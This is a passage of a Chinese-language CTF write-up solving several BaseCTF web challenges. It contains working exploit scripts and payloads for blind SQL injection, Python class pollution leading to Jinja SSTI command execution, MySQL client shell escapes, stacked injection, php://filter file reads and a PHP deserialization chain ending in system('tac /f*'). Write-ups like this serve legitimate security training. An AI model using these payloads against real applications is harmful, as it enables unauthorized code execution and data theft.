    die("你知道的，不可能有RCE");
}
//flag in ctf.flag
$query = "mysql -u root -p123456 -e \"use ctf;select '没有select，让你执行一句又如何';" . $sql . "\"";
system($query); 
```

发现可以插入sql语句，但是禁用了`select`

```sql
?sql=update flag set id = 'wi' where data regexp '^Basectf' and if(data REGEXP '^Basectf{',sleep(3), 1)
```

这是正则的姿势，后面想想好像这个也行

```sql
?sql=show columns from flag
Field Type Null Key Default Extra id varchar(300) YES NULL data varchar(300) YES NULL
```

字符转16进制

```
0x73656c656374202a2066726f6d2060666c616760
```

emm,发现不行，因为只能用一句话，所以还是盲注吧

```python
import requests
import time

url = "http://challenge.basectf.fun:36108/"  # 替换为目标 URL
strings = 'qwertyuiopasdfghjklzxcvbnm-{}1234567890'
target = ''  # 初始的 flag 字符串

for i in range(45):  # 猜测 flag 长度
    for j in strings:
        # 构造 payload
        payload = "update flag set id = 'wi' where data regexp '^BaseCTF' and if(data REGEXP '^{}',sleep(1.5), 1)".format((target + j))
        params = {
            'sql': payload
        }

        # 记录开始时间
        start_time = time.time()
        
        try:
            # 发送请求
            r = requests.get(url=url, params=params)
            end_time = time.time()  # 记录结束时间
            response_time = end_time - start_time  # 计算响应时间

            # 输出调试信息，记录每次的响应时间
            print(f"Trying character: {j}, response time: {response_time:.2f} seconds")

            # 判断是否有延迟（响应时间大于 1 秒更可靠）
            if response_time > 1:  # 调整阈值为 1 秒或以上
                target += j  # 猜测的字符正确，更新 target
                print(f"Found character: {j}, current target: {target}")
                break  # 跳出内层循环，猜测下一个字符
        except requests.RequestException as e:
            print(f"Request failed: {e}")
            continue  # 如果请求失败，跳过继续尝试下一个字符

```

调了半天的脚本发现是靶机过期了，然后调整一下flag就行了

## [Fin] Jinja Mark

一看题目就是个SSTI，有几个路由可以看看

```
/index  注入点

/flag	四位数字
```

先写个脚本来爆破数字

```python
import requests
import time

url="http://challenge.basectf.fun:47522/flag"
for i in range(1000,10000):
    data={
        'lucky_number':i
    }
    r=requests.post(url=url,data=data)
    print(i)
    time.sleep(0.3)
    print(r.text)
    if "用POST方式把 lucky_number 告诉我吧，只有四位数哦" not in r.text:
        break
```

emm,但是爆到2000多的时候我觉得太慢了，于是还是换成`bp`来爆破了

最后爆破出来是5346得到源码

```python
BLACKLIST_IN_index = ['{','}']
def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)
@app.route('/magic',methods=['POST', 'GET'])
def pollute():
    if request.method == 'POST':
        if request.is_json:
            merge(json.loads(request.data), instance)
            return "这个魔术还行吧"
        else:
            return "我要json的魔术"
    return "记得用POST方法把魔术交上来"
```

写个脚本来污染

```python
import requests
import json

url ="http://challenge.basectf.fun:47522/magic"
payload={
    "__class__":{
        "__init__":{
            "__globals__":{
                "BLACKLIST_IN_index":()
            }
        }
    }
}
headers={'Content-Type':'application/json'}
payload_json=json.dumps(payload)
print(payload_json)

r=requests.post(url,data=payload_json,headers=headers)
print(r.text)
```

污染成功，去打`SSTI`

```
http://challenge.basectf.fun:47522/index

flag={{url_for.__globals__.__builtins__['__import__']('os').popen('tac /f*').read()}}
```

## [Fin] Just Readme (前置)

```php
<?php
echo file_get_contents($_POST['file']);
```

CVE-2024-2961,由pwn的溢出打出RCE

## **[Fin] Back to the future**

恢复一下`git`

```
githacker --url http://challenge.basectf.fun:44543/.git/ --output-folder './test'
```

很明显没有恢复完

```
git log --reflog

git reset --hard e2bc04bc70f7b7476ae7ad0e943ef62aa2b5556e

git reset --hard 9d85f10e0192ef630e10d7f876a117db41c30417

git reset --hard 8f7720b7891039b394e26e67ff10d6c6d2a144d5
```

然后发现没有用，这里我们直接尝试去`show`一下历史文件

```
(kali㉿kali)-[~/桌面/tools/GitHack/test/7342810b0f8b9cfe4b3e3b9fb211765f]
└─$ git log --oneline                                                                                                                                      
e2bc04b (HEAD -> master, origin/master, origin/HEAD) Remove Flag
9d85f10 Add What
8f7720b Initial Commit
```

```
git show e2bc04b
```

就拿到`flag`了，重新安装了一下这个工具来做这道题，发现还有更好用的命令

```
git reflog
git show 9d85f10:flag.txt
```

并且安装工具的话也是直接pip就可以了，直接在我的Ubuntu20上面安装，用github上面的方法来安装有依赖冲突，没成功

```
pip3 install GitHacker
```

## [Fin] 1z_php

```php
<?php
highlight_file('index.php');
# 我记得她...好像叫flag.php吧？
$emp=$_GET['e_m.p'];
$try=$_POST['try'];
if($emp!="114514"&&intval($emp,0)===114514)
{
    for ($i=0;$i<strlen($emp);$i++){
        if (ctype_alpha($emp[$i])){
            die("你不是hacker？那请去外场等候！");
        }
    }
    echo "只有真正的hacker才能拿到flag！"."<br>";

    if (preg_match('/.+?HACKER/is',$try)){
        die("你是hacker还敢自报家门呢？");
    }
    if (!stripos($try,'HACKER') === TRUE){
        die("你连自己是hacker都不承认，还想要flag呢？");
    }

    $a=$_GET['a'];
    $b=$_GET['b'];
    $c=$_GET['c'];
    if(stripos($b,'php')!==0){
        die("收手吧hacker，你得不到flag的！");
    }
    echo (new $a($b))->$c();
}
else
{
    die("114514到底是啥意思嘞？。？");
}
# 觉得困难的话就直接把shell拿去用吧，不用谢~
$shell=$_POST['shell'];
eval($shell);
?>
```

绕第一层的时候Demo的参数写错了 ，浪费了一些时间

第一层用8进制绕过，第二层的话，用溢出绕过，第三层的话利用原生类进行读取

但是溢出这里得注意，hackbar发包不好用，所以使用Python脚本但是太多的话，又会直接给关了，不让连接

第三层这个原生类的利用在官方文档中仅仅只是一笔带过了所以测试一下就好了，又是一个新姿势

```php
<?php
echo (new SplFileObject("php://filter/convert.base64-encode/resource=./2.php"))->__toString();
/*成功读取到了
```

```python
import requests

url="http://challenge.basectf.fun:45966/"
params={
    'e[m.p':'0337522',
    'a':'SplFileObject',
    'b':'php://filter/convert.base64-encode/resource=flag.php',
    'c':'__toString'
}
data={
    'try':'1'*1000002+'HACKER'
}
r=requests.post(url=url,params=params,data=data)
print(r.text)
```

还有一个`shell`但是用不上，找不到`flag`

## [Fin] RCE or Sql Inject

```php
<?php
highlight_file(__FILE__);
$sql = $_GET['sql'];
if (preg_match('/se|ec|;|@|del|into|outfile/i', $sql)) {
    die("你知道的，不可能有sql注入");
}
if (preg_match('/"|\$|`|\\\\/i', $sql)) {
    die("你知道的，不可能有RCE");
}
$query = "mysql -u root -p123456 -e \"use ctf;select 'ctfer! You can\\'t succeed this time! hahaha'; -- " . $sql . "\"";
system($query);
```

`mysql`远程连接中可以执行命令?!,泰裤辣

```
system    (\!) Execute a system shell command.
```

```
http://challenge.basectf.fun:33244/?sql=%0asystem env
```

## [Fin] Sql Inject or RCE

```php
<?php
highlight_file(__FILE__);
$sql = $_GET['sql'];
if (preg_match('/se|ec|st|;|@|delete|into|outfile/i', $sql)) {
    die("你知道的，不可能有sql注入");
}
if (preg_match('/"|\$|`|\\\\/i', $sql)) {
    die("你知道的，不可能有RCE");
}
$query = "mysql -u root -p123456 -e \"use ctf;select 'ctfer! You can\\'t succeed this time! hahaha'; -- " . $sql . "\"";
system($query);
```

使用`delimiter`和`handler`打一个堆叠注入

第一个关键词测试一下就知道怎么用了

```sql
mysql> delimiter ?
mysql> show tables?
+-----------------+
| Tables_in_newdb |
+-----------------+
| flag            |
| sds_user        |
| users           |
+-----------------+
3 rows in set (0.02 sec)

mysql> select * from flag?
+----+------------+-------------------+
| id | name       | description       |
+----+------------+-------------------+
|  1 | alpha      | first             |
|  2 | beta       | second            |
|  3 | gamma      | third             |
|  4 | alphabet   | first-alphabet    |
|  5 | beta-gamma | second-beta-gamma |
+----+------------+-------------------+
5 rows in set (0.02 sec)
```

所以我们重新设置之后就可以打堆叠，也就是第四周想进行的操作

```sql
mysql> handler flag open?
Query OK, 0 rows affected (0.01 sec)

mysql> handler flag read next?
+----+-------+-------------+
| id | name  | description |
+----+-------+-------------+
|  1 | alpha | first       |
+----+-------+-------------+
1 row in set (0.02 sec)
```

成功读取了

````
?sql=%0adelimiter wi%0ahandler flag openwi%0ahandler flag read next
````

## [Fin] Lucky Number

```python
from flask import Flask,request,render_template_string,render_template
from jinja2 import Template
import json
import heaven
def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

class cls():
    def __init__(self):
        pass

instance = cls()

BLACKLIST_IN_index = ['{','}']
def is_json(data):
    try:
        json.loads(data)
        return True
    except ValueError:
        return False

@app.route('/m4G1c',methods=['POST', 'GET'])
def pollute():
    if request.method == 'POST':
        if request.is_json:
            merge(json.loads(request.data), instance)
            result = heaven.create()
            message = result["message"]
            return "这个魔术还行吧
" + message
        else:
            return "我要json的魔术"
    return "记得用POST方法把魔术交上来"


#heaven.py

def create(kon="Kon", pure="Pure", *, confirm=False):
    if confirm and "lucky_number" not in create.__kwdefaults__:
        return {"message": "嗯嗯，我已经知道你要创造东西了，但是你怎么不告诉我要创造什么？", "lucky_number": "nope"}
    if confirm and "lucky_number" in create.__kwdefaults__:
        return {"message": "这是你的lucky_number，请拿好，去/check下检查一下吧", "lucky_number": create.__kwdefaults__["lucky_number"]}

    return {"message": "你有什么想创造的吗？", "lucky_number": "nope"}
```

那么很明显看到可以污染两个属性之后就可以进行SSTI了

`confirm`和`lucky_number`

```python
import requests
import json

url ="http://challenge.basectf.fun:30938"
payload={
    "__init__":{
        "__globals__":{
            "json":{
                "__spec__":{
                    "__init__":{
                        "__globals__":{
                            "sys":{
                                "modules":{
                                    "heaven":{
                                        "create":{
                                            "__kwdefaults__":{
                                                "confirm":True,
                                                "lucky_number":"5346"
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
headers={'Content-Type':'application/json'}
payload_json=json.dumps(payload)
print(payload_json)

r=requests.post(url=url+"/m4G1c",data=payload_json,headers=headers)
if "这个魔术还行吧" in r.text:
    r1=requests.get(url=url+"/check")
    print(r1.text)
```

然后进行SSTI

```
http://challenge.basectf.fun:32611/ssSstTti1

POST:
flag={{url_for.__globals__.__builtins__['__import__']('os').popen('tac /f*').read()}}
```

## [Fin] ez_php

```php
<?php
highlight_file(__file__);
function substrstr($data)
{
    $start = mb_strpos($data, "[");
    $end = mb_strpos($data, "]");
    return mb_substr($data, $start + 1, $end - 1 - $start);
}

class Hacker{
    public $start;
    public $end;
    public $username="hacker";
    public function __construct($start){
        $this->start=$start;
    }
    public function __wakeup(){
        $this->username="hacker";
        $this->end = $this->start;
    }

    public function __destruct(){
        if(!preg_match('/ctfer/i',$this->username)){
            echo 'Hacker！';
        }
    }
}

class C{
    public $c;
    public function __toString(){
        $this->c->c();
        return "C";
    }
}

class T{
    public $t;
    public function __call($name,$args){
        echo $this->t->t;
    }
}
class F{
    public $f;
    public function __get($name){
        return isset($this->f->f);
    }

}
class E{
    public $e;
    public function __isset($name){
        ($this->e)();
    }

}
class R{
    public $r;

    public function __invoke(){
        eval($this->r);
    }
}

if(isset($_GET['ez_ser.from_you'])){
    $ctf = new Hacker('{{{'.$_GET['ez_ser.from_you'].'}}}');
    if(preg_match("/\[|\]/i", $_GET['substr'])){
        die("NONONO!!!");
    }
    $pre = isset($_GET['substr'])?$_GET['substr']:"substr";
    $ser_ctf = substrstr($pre."[".serialize($ctf)."]");
    $a = unserialize($ser_ctf);
    throw new Exception("杂鱼~杂鱼~");
}
```

这一看就是一个逃逸序列化

```
Hacker::destruct->C::toString->T::call->F::get->E::isset->R::invoke
```

wakeup直接引用地址绕过，我记得我的`php反序列化`里面提及到过，将`end`处理了，外面会再序列化一层，这里与nep中的一样，需要逃逸，我再写写

> 每发送一个%f0abc，mb_strpos认为是4个字节，mb_substr认为是1个字节，相差3个字节(向后移动三位)
> 每发送一个%f0%9fab,mb_strpos认为是3个字节，mb_substr认为是1个字节，相差2个字节(向后移动两位)
> 每发送一个%f0%9f%9fa,mb_strpos认为是2个字节，mb_substr认为是1个字节，相差1个字节(向后移动一位)
>
> 每发送一个%9f,mb_strpos会忽略，mb_substr认为是1个字节，相差1个字节(向前移动一位)

然后我们先写`poc`

```php
<?php

class Hacker{
    public $start;
    public $end;
    public $username="hacker";
}
class C{
    public $c;
}
class T{
    public $t;
}
class F{
    public $f;
}
class E{
    public $e;
}
class R{
    public $r;
}
$a=new Hacker();
$a->end=&$a->username;
$a->start=new C();
$a->start->c=new T();
$a->start->c->t=new F();
$a->start->c->t->f=new E();
$a->start->c->t->f->e=new R();
$a->start->c->t->f->e->r='phpinfo();';
$b=array($a,null);
echo serialize($b);
```

然后写个Demo生成看看那里需要逃逸

```php
<?php
highlight_file(__file__);

class Hacker{
    public $start;
    public $end;
    public $username="hacker";
    public function __construct($start){
        $this->start=$start;
    }
    public function __wakeup(){
        $this->username="hacker";
        $this->end = $this->start;
    }

    public function __destruct(){
        if(!preg_match('/ctfer/i',$this->username)){
            echo 'Hacker！';
        }
    }
}

class C{
    public $c;
    public function __toString(){
        $this->c->c();
        return "C";
    }
}

class T{
    public $t;
    public function __call($name,$args){
        echo $this->t->t;
    }
}
class F{
    public $f;
    public function __get($name){
        return isset($this->f->f);
    }

}
class E{
    public $e;
    public function __isset($name){
        ($this->e)();
    }

}
class R{
    public $r;

    public function __invoke(){
        eval($this->r);
    }
}

if(isset($_GET['ez_ser.from_you'])){
    $ctf = new Hacker('{{{'.$_GET['ez_ser.from_you'].'}}}');
    echo serialize($ctf);
}
```

传参

```
?ez[ser.from_you=a:2:{i:0;O:6:"Hacker":3:{s:5:"start";O:1:"C":1:{s:1:"c";O:1:"T":1:{s:1:"t";O:1:"F":1:{s:1:"f";O:1:"E":1:{s:1:"e";O:1:"R":1:{s:1:"r";s:18:"system("tac /f*");";}}}}}s:3:"end";s:6:"hacker";s:8:"username";R:9;}i:1;N;}
```

得到了我们本身的`ctf`的序列化payload

```
O:6:"Hacker":3:{s:5:"start";s:219:"{{{a:2:{i:0;O:6:"Hacker":3:{s:5:"start";O:1:"C":1:{s:1:"c";O:1:"T":1:{s:1:"t";O:1:"F":1:{s:1:"f";O:1:"E":1:{s:1:"e";O:1:"R":1:{s:1:"r";s:18:"system("tac /f*");";}}}}}s:3:"end";s:6:"hacker";s:8:"username";R:9;}i:1;N;}}}}";s:3:"end";N;s:8:"username";s:6:"hacker";}
截取有用的部分

a:2:{i:0;O:6:"Hacker":3:{s:5:"start";O:1:"C":1:{s:1:"c";O:1:"T":1:{s:1:"t";O:1:"F":1:{s:1:"f";O:1:"E":1:{s:1:"e";O:1:"R":1:{s:1:"r";s:18:"system("tac /f*");";}}}}}s:3:"end";s:6:"hacker";s:8:"username";R:9;}i:1;N;}
```

那么为了不影响我们正常反序列化

```
O:6:"Hacker":3:{s:5:"start";s:211:"{{{
这些部分都是需要逃逸的
```

```python
length=len('O:6:"Hacker":3:{s:5:"start";s:211:"{{{')
print(length)
# 38
```

所以是

```
%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0%9fab
```

那么本身的序列化payload是

```
a:2:{i:0;O:6:"Hacker":3:{s:5:"start";O:1:"C":1:{s:1:"c";O:1:"T":1:{s:1:"t";O:1:"F":1:{s:1:"f";O:1:"E":1:{s:1:"e";O:1:"R":1:{s:1:"r";s:18:"system("tac /f*");";}}}}}s:3:"end";s:6:"hacker";s:8:"username";R:9;}i:1;N;}
```

本身还要利用GC绕过抛出错误，这里直接进行修改即可

```
a:2:{i:0;O:6:"Hacker":3:{s:5:"start";O:1:"C":1:{s:1:"c";O:1:"T":1:{s:1:"t";O:1:"F":1:{s:1:"f";O:1:"E":1:{s:1:"e";O:1:"R":1:{s:1:"r";s:18:"system("tac /f*");";}}}}}s:3:"end";s:6:"hacker";s:8:"username";R:9;}i:0;N;}
```

最终payload

```
?substr=%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0%9fab&ez[ser.from_you=a:2:{i:0;O:6:"Hacker":3:{s:5:"start";O:1:"C":1:{s:1:"c";O:1:"T":1:{s:1:"t";O:1:"F":1:{s:1:"f";O:1:"E":1:{s:1:"e";O:1:"R":1:{s:1:"r";s:18:"system("tac /f*");";}}}}}s:3:"end";s:6:"hacker";s:8:"username";R:9;}i:0;N;}
```

# 0x03 小结

打不动了，而且后面的我挺多知识点涉及的，我害的练啊
